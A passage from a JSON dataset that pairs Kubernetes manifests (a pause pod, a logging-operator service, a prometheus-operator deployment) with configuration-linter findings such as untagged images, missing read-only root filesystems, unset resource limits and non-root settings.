    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9454",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9455",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "9456",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "9457",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "9458",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "9459",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "9460",
    "manifest_path": "data/manifests/the_stack_sample/sample_3604.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinuxoptions0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: somevalue\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "9461",
    "manifest_path": "data/manifests/the_stack_sample/sample_3605.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: cluster-logging-operator\n  name: cluster-logging-operator-metrics\nspec:\n  ports:\n  - name: http-metrics\n    port: 8686\n    protocol: TCP\n    targetPort: 8686\n  selector:\n    name: cluster-logging-operator\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:cluster-logging-operator])"
  },
  {
    "id": "9462",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "9463",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
  },
  {
    "id": "9464",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prometheus-operator\" not found"
  },
  {
    "id": "9465",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "9466",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9467",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-monitoring\n        - --alertmanager-instance-namespaces=openshift-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        - --web.enable-tls=true\n        - --web.tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --web.tls-min-version=VersionTLS12\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 5m\n            memory: 60Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=https://prometheus-operator.openshift-monitoring.svc:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --upstream-ca-file=/etc/configmaps/operator-cert-ca-bundle/service-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 40Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-tls\n          readOnly: false\n        - mountPath: /etc/configmaps/operator-cert-ca-bundle\n          name: operator-certs-ca-bundle\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-tls\n        secret:\n          secretName: prometheus-operator-tls\n      - configMap:\n          name: operator-certs-ca-bundle\n        name: operator-certs-ca-bundle\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy\" has memory limit 0"
  },
  {
    "id": "9468",
    "manifest_path": "data/manifests/the_stack_sample/sample_3607.yaml",
